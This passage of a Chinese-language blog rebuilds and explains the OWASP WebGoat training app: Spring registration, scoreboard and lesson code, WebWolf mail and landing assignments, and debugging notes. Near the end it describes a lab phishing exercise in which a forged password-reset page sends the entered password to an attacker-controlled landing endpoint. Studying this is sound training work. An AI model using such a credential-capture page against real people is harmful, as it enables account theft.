        return messages.getMessage(msg);
    }
}
```

## users

### RegistrationController

```java
package com.wanan.webgoat.container.users;

import lombok.AllArgsConstructor;
import lombok.Value;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.stereotype.Controller;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.validation.Valid;

@Controller
@AllArgsConstructor
@Slf4j
public class RegistrationController {
    private UserValidator userValidator;
    private UserService userService;
    private AuthenticationManager authenticationManager;

    @GetMapping("/registration")
    public String showForm(UserForm userForm){
        return "registration";
    }
    @PostMapping("/register.mvc")
    public String registration(@ModelAttribute("userForm") @Valid UserForm userForm, BindingResult bindingResult, HttpServletRequest request) throws ServletException{
        userValidator.validate(userForm,bindingResult);

        if (bindingResult.hasErrors()){
            return "registration";
        }
        userService.addUser(userForm.getUsername(),userForm.getPassword());
        request.login(userForm.getUsername(),userForm.getPassword());
        return "redirect:/attack";
        
    }
}
```

### UserValidator

```java
package com.wanan.webgoat.container.users;

import lombok.AllArgsConstructor;
import org.springframework.stereotype.Component;

import org.springframework.validation.Errors;
import org.springframework.validation.Validator;

@Component
//实现bean的注入,当我们的类不属于@controller @services的时候我们就可以使用@component来标注这个类
@AllArgsConstructor
public class UserValidator implements Validator {
    private  final  UserRepository userRepository;

    @Override
    public  boolean supports(Class<?> clazz){
        return UserForm.class.equals(clazz);
    }
    @Override
    public void validate(Object o, Errors errors){
        UserForm userForm = (UserForm) o;
        if (userRepository.findByUsername(userForm.getUsername()) != null){
            errors.rejectValue("username","username.duplicate");
        }
        if (!userForm.getMatchingPassword().equals(userForm.getPassword())){
            errors.rejectValue("matchingPassword","password.diff");
        }
    }

}
```

### UserForm

```java
package com.wanan.webgoat.container.users;

import lombok.Getter;
import lombok.Setter;

import javax.validation.constraints.NotNull;
import javax.validation.constraints.Pattern;
import javax.validation.constraints.Size;

@Getter
@Setter
public class UserForm {
    @NotNull
    @Size(min = 6,max = 45)
    @Pattern(regexp = "[a-z0-9-]*",message = "can only contain lowercase letters.digits,and -")
    private String username;
//    表单数据中的username
    @NotNull
    @Size(min = 6,max = 10)
    private String password;
    @NotNull
    @Size(min = 6,max = 10)
    private String matchingPassword;
    @NotNull
    private String agree;
}

```

### Scoreboard

```java
package com.wanan.webgoat.container.users;

import com.wanan.webgoat.container.i18n.PluginMessages;
import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.session.Course;
import lombok.AllArgsConstructor;
import lombok.Getter;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

@RestController
@AllArgsConstructor
public class Scoreboard {
    private final  UserTrackerRepository userTrackerRepository;
    private final  UserRepository userRepository;
    private final Course course;
    private final PluginMessages pluginMessages;
    @AllArgsConstructor
    @Getter
    private class Ranking{
        private String username;
        private List<String> flagsCaptured;
    }
    @GetMapping("/scoreboard-data")
    public List<Ranking> getRankings(){
        List<WebGoatUser> allUsers = userRepository.findAll();
        List<Ranking> rankings = new ArrayList<>();
        for (WebGoatUser user : allUsers){
            if (user.getUsername().startsWith("csrf-")){
                continue;
            }
            UserTracker userTracker = userTrackerRepository.findByUser(user.getUsername());
            rankings.add(new Ranking(user.getUsername(),challengesSolved(userTracker)));
        }
        rankings.sort((o1,o2) -> o2.getFlagsCaptured().size() - o1.getFlagsCaptured().size());
        return rankings;
    }
    private List<String> challengesSolved(UserTracker userTracker){
        List<String> challenges = List.of("Challenge1", "Challenge2", "Challenge3", "Challenge4", "Challenge5", "Challenge6", "Challenge7", "Challenge8", "Challenge9");
        return challenges.stream()
                .map(userTracker::getLessonTracker)
                .flatMap(Optional::stream)
                .filter(LessonTracker::isLessonSolved)
                .map(LessonTracker::getLessonName)
                .map(this::toLessonTitle)
                .toList();
    }
    private String toLessonTitle(String id){
        String titleKey = course.getLessons().stream()
                .filter(l->l.getId().equals(id))
                .findFirst()
                .map(Lesson::getTitle)
                .orElse("No title");
        return pluginMessages.getMessage(titleKey,titleKey);
    }
}
```

### UserSession

```java
package com.wanan.webgoat.container.users;

import com.google.common.eventbus.AllowConcurrentEvents;
import lombok.AccessLevel;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.NoArgsConstructor;

import org.springframework.data.annotation.Id;

@Getter
@AllArgsConstructor
@NoArgsConstructor(access = AccessLevel.PROTECTED)
public class UserSession {
    private WebGoatUser webGoatUser;
    @Id
    private String sessionId;
}

```



# lessons

从下面开始我们就需要去到真正的题目中去了 我们慢慢分析

## webgoat_introduction

### WebGoatIntroduction

```java
package com.wanan.webgoat.lessons.webgoat_introduction;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
//实现bean的注入,当我们的类不属于@controller @services的时候我们就可以使用@component来标注这个类
public class WebGoatIntroduction extends Lesson {
    @Override
    public Category getDefaultCategory(){
        return Category.INTRODUCTION;
    }
    @Override
    public String getTitle(){
        return "webgoat.title";
    }
}
```

### 排错

这里写完这些之后启动的时候发现出现了一个非常重要的错误,这里记录一下我去寻找错误代码的过程与思路.

这里的错误就是我们打开之后它没有显示我们的adoc文件的内容

![](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822162820454.png)

![image-20220822162915462](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822162915462.png)

首先我们需要去查看有无异常信息的抛出

这里给了一个空指针异常

![image-20220822163116038](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163116038.png)

我们打个断点去查看哪里出现了问题

![image-20220822163211392](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163211392.png)

很明显就是这里的resoucre的名字出现了问题 那么我首先去寻找了一下在哪里有调用了这里computeTemplateResource方法,因为这里很明显传参就出现了问题 其次这里也可以简单的看出来肯定是多了一个/或者少了一个/导致截取出现了问题 最终路径拼接不起来

![image-20220822163301810](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163301810.png)

![image-20220822163252038](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163252038.png)

就这么几个,我们看一下其实都不是我们自己去调用的,而是thymeleaf去给我们调用的

![image-20220822163605299](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163605299.png)

那么我们现在有两种思路第一种 我们根据这错误可能的形成原因去搜索可能存在错误的代码 这里肯定是lessons + ...去进行拼接.因此我们直接去搜索lessons 在根据连接操作找到了这行代码

![image-20220822164616384](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822164616384.png)

这里也是与先前推测的连接略有出入,但是这里也是进行截断操作

很明显这里缺少了一个. 导致在替换的时候出现了问题

![image-20220822165450004](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822165450004.png)

![image-20220822165330017](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822165330017.png)

第二种方式 根据我们现在的代码是针对lessons的,因此我们之间找到container 下面的lessons去翻找代码.

成功解决一项错误

![image-20220822181047833](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822181047833.png)

### 解析

这里的Category其实是一个枚举类型因此这里其实返回的是关于本关卡的介绍 也就是这个是同一类型的关卡

![image-20220823220049876](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823220049876.png)

进行两次查找去看看谁调用了这个方法

![image-20220823220128471](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823220128471.png)

![image-20220823220201729](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823220201729.png)

这里找到了Cource方法,在这里很明显吗这个类就是一个统计关卡的类

![image-20220823221755693](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823221755693.png)

LessonMenuService这里很容易理解这里的这个就是在左边栏进行关卡的展示的

![image-20220823222538587](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823222538587.png)

我们接下来去看看LessonMenuItem

![image-20220823224951738](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823224951738.png)

这里的getTitle()其实是配置文件中的这个

![image-20220824184332114](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824184332114.png)

![image-20220824184532463](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824184532463.png)

## webwolf_introduction

### WebWolfIntroduction

```java
package com.wanan.webgoat.lessons.webwolf_introduction;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class WebWolfIntroduction extends Lesson {
    @Override
    public Category getDefaultCategory(){
        return Category.INTRODUCTION;
    }
    @Override
    public  String getTitle(){
        return "webwolf.title";
    }
}

```

顺手处理另一个问题

![image-20220822210017920](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210017920.png)

这是原版的链接,点击后会爆404错误,这里我们首先想到的肯定是这个路径没有对应进去我们的系统,那么这里我们首先进行全局搜索

![image-20220822210043380](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210043380.png)

![image-20220822210149301](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210149301.png)

这里首先发现并没有这个路径,那么接下来由于WebWolf是我们添加的默认前缀,那么我们只需要去搜索后面的/home就好

![image-20220822210327510](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210327510.png)

这里除去上面的dockerfile的home,那么我们首先看到的就是这里的addViewController(),这里匹配的路径是/home,那么我们就有两个思路去修复,一是去更改html代码,使之进行匹配,第二就是更改这里在前面添加上/WebWolf,这里我们进行添加并重启进行尝试

![image-20220822210604697](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210604697.png)

成功跳转 但是这里出现了一个重要的问题 当我们直接从这里去打开 这里跳转的是/home 两种情况出现差别主要是处理的逻辑不同

![image-20220823185716907](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823185716907.png)

![image-20220823185649325](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823185649325.png)

我们先看第一种的操作

![image-20220823190012198](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823190012198.png)

![image-20220823190046301](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823190046301.png)

可以清楚的看到这里其实是直接通过链接进行访问的webwolf

![image-20220823190130574](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823190130574.png)

而第二种其实是通过重定向跳转的

![image-20220823185925351](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823185925351.png)

稍做修改 就可以成功跳转了

![image-20220823192905208](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823192905208.png)

### MailAssignment

```java
package com.wanan.webgoat.lessons.webwolf_introduction;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

@RestController
//@RestController 是@controller和@ResponseBody 的结合
//@Controller 将当前修饰的类注入到springboot ioc容器,使得从该类所在的项目跑起来的过程中,这个类就被实例化
//@ResponseBody 它的作用简短的说就是指该类中的api即可返回的数据 不管对应方法返回map或者其他的object,它会以json字符串的形式返回给客户端

public class MailAssignment extends AssignmentEndpoint {
    private final String webWolfURL;
    private RestTemplate restTemplate;
//    restTemplat像一个封装好的网络请求工具类这里我们使用它来去发送url请求

    public MailAssignment(RestTemplate restTemplate, @Value("${webwolf.mail.url}") String webWolfURL){
//        这里的@Value的值可以在application-webgoat.properties中找到,其实是webwolf的email的url
        this.restTemplate =restTemplate;
        this.webWolfURL = webWolfURL;
    }
    @PostMapping("/WebWolf/mail/send")
    @ResponseBody
    public AttackResult sendEmail(@RequestParam String email){
//        获取post请求中的email参数
        String username = email.substring(0,email.indexOf("@"));
//        通过先获取@的位置接着截取@之前的值如 123@test.com 就会截取123
        if (username.equalsIgnoreCase(getWebSession().getUserName())){
//            将得到的值忽略大小写与当前用户名进行对比
            Email mailEvent = Email.builder()
//                    由于我们在email类中设置了@Data 与 @Builder注解 这样我们就可以进行链式赋值 首先调用了builder()
                    .recipient(username)
                    .title("Test messages from WebWolf")
                    .contents("This is a test message from WebWolf, your unique code is: "+ StringUtils.reverse(username))
//                    这里书写了邮箱内容 并附带了unique code
                    .sender("webgoat@owasp.org")
                    .build();

            try {
                restTemplate.postForEntity(webWolfURL,mailEvent,Object.class);
//                这里是进行了一个post网络请求 Object.class是以对象发送? 解释看下图
            }catch (RestClientException e){
                return informationMessage(this).feedback("webwolf.email_failed").output(e.getMessage()).build();
//                这里是没请求成功后的返回html的信息 这里进informationMessage进行查看
//                由于之前的messages已经获取了配置文件 ,那么这里我们之间读取配置文件并进行赋值
            }
            return  informationMessage(this).feedback("webwolf.email_send").feedbackArgs(email).build();
        }else {
            return informationMessage(this).feedback("webwolf.email_mismatch").feedbackArgs(username).build();
        }

    }
    @PostMapping("/WebWolf/mail")
    @ResponseBody
    public AttackResult completed(@RequestParam String uniqueCode){
//        首先获取post表单 uniqueCode
        if (uniqueCode.equals(StringUtils.reverse(getWebSession().getUserName()))){
//            将获取到的值进行逆序与当前用户名进行对比 为什么是逆序看上面的mailEvent 赋值操作
            return success(this).build();
//            这里如果相等就完成了这项挑战调用success 
        }else {
            return failed(this).feedbackArgs("webwolf.code_incorrect").feedbackArgs(uniqueCode).build();
        }
    }


}

```

![image-20220824191613764](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824191613764.png)

![image-20220824201107883](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824201107883.png)

![image-20220824202804678](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824202804678.png)

这里可以看到是自动装配的

![image-20220824204453426](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824204453426.png)

这里也查找的Bean容器可见下面仅仅是设置了一下基础信息 我们进去pluginMessages()构造方法看看先

![image-20220824204703643](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824204703643.png)

这里也是比较简单的进行了基础值的赋值操作 我们先来看看这个Messages

![image-20220824204828368](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824204828368.png)

可以看到这里的setBasename

![image-20220824210408565](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824210408565.png)

清楚看到可以读取这里的messages配置文件

![image-20220824210505308](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824210505308.png)

我们接着去看refreshProperties

这里可以看到我们自己并没有去调用这个refreshProperties() 说明这里也是框架给我们调用的 这里我们分析一下

![image-20220824205225984](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824205225984.png)

![image-20220824213012109](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824213012109.png)

### Email

```java
package com.wanan.webgoat.lessons.webwolf_introduction;

import lombok.Builder;
import lombok.Data;

import java.io.Serializable;

@Builder
// @Builder作用见下图
//可以通过链式调用的方法给类中的参数进行赋值
@Data
//作为数据类
public class Email implements Serializable {
    private String contents;
    private String sender;
    private String title;
    private String recipient;
}

```

![image-20220824191142252](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824191142252.png)

![image-20220824191212840](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824191212840.png)

简单易懂

### 排错

但是这里发送邮箱会报错

![image-20220822215626523](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822215626523.png)

![](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822215626523.png)

将id自增策略更改如下

```java
@GeneratedValue(strategy =  GenerationType.IDENTITY)
```

![image-20220822215551416](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822215551416.png)

这里更改完成之后遇到了一个无法解决的报错 说表并不存在 但是我翻遍了也没找到这个表在哪建的 因此我觉得换回原先的hsqldb数据库,但是这个数据库存在一个极大的弊端就是他的连接只能存在一个也就是如果项目启动起来的时候,就无法通过

![image-20220823123531389](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823123531389.png)

### 更换为hsqldb并进行连接查看

首先我们换回配置文件

![image-20220823124025849](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124025849.png)

![image-20220823124210014](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124210014.png)

这里成功启动起来

![image-20220823124233038](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124233038.png)

我们尝试去连接 

首先这里存在几个值路径信息 url 数据库 用户 和密码 很明显这里的路径信息和数据库肯定是用来拼接最后的url的,首先我们尝试获取一下这里的值

![image-20220823124328862](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124328862.png)

一种比较简单的方式就是去查看我们项目启动后输出的日志信息

![image-20220823124454018](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124454018.png)

第二种方式 这里我们可以去自己去寻找具体路径是如何进行拼接的然后自己去查看位置

![image-20220823124542653](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124542653.png)

第三种方式我们尝试去输出一下日志信息

![image-20220823124943809](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124943809.png)

下一个问题我们如何去寻找用户名密码 首先我尝试了无密码的认证方式,发现并未通过

![image-20220823125109247](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125109247.png)

接下来我开始翻看这些文件 在这里发现了两个特殊的参数 前面这个SA一看就是用户名 后面的一看就是一个MD5值

![image-20220823125145717](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125145717.png)

发现是空密码

![image-20220823125245662](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125245662.png)

但是第一次其实并没有连接成功主要原因其实就是我的项目已经启动了,因此占用着这个进程,导致我的连接失败了

![image-20220823125438715](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125438715.png)

停止项目之后就连接成功了

![image-20220823125547412](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125547412.png)

其次这里需要在架构这里添加上所有的数据库

![image-20220823125800211](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125800211.png)

这里我们如果想要去更改用户名和密码的话,相信你也能想到了

更改这个文件并更改配置文件即可

![image-20220823125647530](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125647530.png)

![image-20220823130027522](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823130027522.png)

现在便成功的连接上了

![image-20220823125824892](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125824892.png)

当需要启动项目时点击停用即可 不知道有没有方式可以去实现同时连接

![image-20220823125901966](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125901966.png)

这里需要先对数据进行初始化

![image-20220823181703373](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823181703373.png)

测试下邮箱功能 注意这里的@前面需要是一个你注册的用户名

![image-20220823210827974](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823210827974.png)

去webwolf可以查看到

![image-20220823210956649](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823210956649.png)

这里根据这个unique也可以查看到成功完成了这项挑战

![image-20220823211013116](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823211013116.png)

### LandingAssignment

```java
package com.wanan.webgoat.lessons.webwolf_introduction;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;

import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import java.net.URI;
import java.net.URISyntaxException;

@RestController
public class LandingAssignment extends AssignmentEndpoint {

    @Value("${webwolf.landingpage.url}")
    private String landingPageUrl;
//    同样的webwolf的landing的url在配置文件中可找

    @PostMapping("/WebWolf/landing")
    @ResponseBody
    public AttackResult click(String uniqueCode){
        if (StringUtils.reverse(getWebSession().getUserName()).equals(uniqueCode)){
//           如果将当前用户名字逆向对比为外部输入uniqueCode
            return success(this).build();
        }
        return failed(this).feedback("webwolf.landing_wrong").build();
    }
    @GetMapping("/WebWolf/landing/password-reset")
    public ModelAndView openPasswordReset(HttpServletRequest request) throws URISyntaxException{
        URI uri = new URI(request.getRequestURI().toString());
//        对一个url进行拆分 如http 127.0.0.1 8081 /webwolf
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject("webwolfUrl",landingPageUrl);
//        添加两个model 一个url 一个 uncode
        modelAndView.addObject("uniqueCode",StringUtils.reverse(getWebSession().getUserName()));
        modelAndView.setViewName("lessons/webwolf_introduction/templates/webwolfPasswordReset.html");
//        设置视图 映射到哪一个html文件 根据路径去可以简单找到
        return modelAndView;
    }
}

```

![image-20220824222750024](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824222750024.png)

可以看到这里是一个form表单 而且当点击save之后会向webwolfurl去发送请求

![image-20220824222816406](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824222816406.png)

![image-20220824223002352](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824223002352.png)

到这里我们先放一下去看一下webwolf 的landing是怎么配置的

这里也比较简单能够理解就是当请求/landing/**路径下时会打印一个日志 这里我们暂时看不出问题来 所以我们先去看requests

![image-20220825095155593](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095155593.png)

![image-20220825095148670](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095148670.png)

![image-20220825095920808](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095920808.png)

这里很容易找到其实这里的初始化操作是在@Bean执行的而且是交给spring容器管理的

![image-20220825095907977](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095907977.png)

![image-20220825100305798](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825100305798.png)

现在我们已经知道了我们的http请求其实是存放在traces中的,那么是在什么时候添加进去的呢?

可以看到其实是spring自动调用的

![image-20220825110424447](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825110424447.png)

这里我进行了简单的尝试,发现在进入return语句之后 在log.trace执行之前调用了add方法.这里不太能理解为什么.主要是一个http请求应该包括响应 那么按理应该是在所有的return结束之后在调用才对啊.

![image-20220825110800731](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825110800731.png)

我们去看一下request

 这里可能有点难以理解 刚开始我不知道这个t是如何去赋值的 其实这里简单的理解 就是首先我们traceRepository.findAllTraces() 这个获取的是一个list 而后面的stream()其实就代表着一个一个的去读取 接着呢 在每一次读取之中进行了过滤filter 操作 ,而由于每一次读取的时候是读取到了一个HttpTrace对象,那么这个参数t自然就是读取到的这个HttpTrace对象了

![image-20220825113223673](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825113223673.png)

下面这里也很好理解就是转换成json格式的数据

![image-20220825144305039](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825144305039.png)

将得到的值进行存入

![image-20220825145014574](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825145014574.png)

现在可以完全理解这个系统了吗

这里的更改密码其实是攻击者伪造的更改密码链接 但是其实这里点击save之后会跳转 实战时是需要进行重新修改的

![image-20220825145300839](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825145300839.png)

当我们更改之后就会将更改的密码发送到

![image-20220825145344751](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825145344751.png)

![image-20220825150618105](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825150618105.png)

由于webwolf会存储landing路径下的请求因此这里会进行展示

![image-20220825150857974](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825150857974.png)

提交即可过关

![image-20220825150925418](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825150925418.png)

## http_basics

### HttpBasics

```java
package com.wanan.webgoat.lessons.http_basics;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
//实现bean的注入,当我们的类不属于@controller @services的时候我们就可以使用@component来标注这个类
public class HttpBasics  extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.GENERAL;
    }

    @Override
    public String getTitle() {
        return "1.http-basics.title";
    }
}
```

介绍

![image-20220825153410260](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825153410260.png)

### HttpBasicsLesson

```java
package com.wanan.webgoat.lessons.http_basics;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"http-basics.hints.http_basics_lesson.1"})
//这里的hints需要我们重点去看
public class HttpBasicsLesson extends AssignmentEndpoint {
    @PostMapping("/HttpBasics/attack1")
    @ResponseBody
    public AttackResult completed(@RequestParam String person){
//        获取person参数
        if (!person.isBlank()){
//            如果字符串不仅仅是包含空字符
            return success(this)
                    .feedback("http-basics.reversed")
                    .feedbackArgs(new StringBuilder(person).reverse().toString())
                    .build();
        }else {
            return failed(this).feedback("http-basics.empty").build();
        }
    }
}
```

这里的show hints其实是注解 我们需要去看看

![image-20220825155519406](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825155519406.png)

这里存在我们对AssignmentHints接口的定义 其中有一个value参数

![image-20220825155628662](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825155628662.png)

在这里我们找到了用法

![image-20220825155726264](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825155726264.png)

一步步往上查找

![image-20220825160517445](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825160517445.png)

![image-20220825160538706](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825160538706.png)

这里可见对course进行了bean的注入

![image-20220825160729294](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825160729294.png)

感觉这里其实是无法调用到的 找遍也没有发现那个请求发送到这里 

![image-20220825161854634](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825161854634.png)

其次在StartLesson类的构造方法我并未找到有用户调用 那么原因是不是由于@Controller导致该类有springboot帮助我们去调用了

接着我们去看bean对象的赋值

![image-20220825164550766](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825164550766.png)

![image-20220825164632442](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825164632442.png)

现在我们去看new Assignment

![image-20220825164901828](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825164901828.png)

现在我们已经理解了hints存储在了哪里,接下来我们去寻找哪里进行了调用获取hints

![image-20220825170206161](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825170206161.png)

![image-20220825170219828](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825170219828.png)

![image-20220825170449078](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825170449078.png)

![image-20220825171015851](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825171015851.png)

一个hint 一个路径

![image-20220825171032480](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825171032480.png)

聪明的你一定发现了 这里的hint并不是点击请求的而是一次性请求 存储在前端的

那么这关我们只要不输入空字符即可过关

![image-20220825171630319](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825171630319.png)

### HttpBasicsQuiz

```java
package com.wanan.webgoat.lessons.http_basics;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AssignmentPath;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"http-basics.hints.http_basic_quiz.1","http-basics.hints.http_basic_quiz.2"})
@AssignmentPath("HttpBasics/attack2")
//这里AssignmentPath 需要去看下
public class HttpBasicsQuiz extends AssignmentEndpoint {
    @PostMapping("/HttpBasics/attack2")
    @ResponseBody
    public AttackResult completed(@RequestParam String answer,@RequestParam String magic_answer,@RequestParam String magic_num){
        if ("POST".equalsIgnoreCase(answer) && magic_answer.equals(magic_num)){
//            如果post请求参数中answer与POST字符相同并且参数中magic_answer 与 magic_num相同就过关
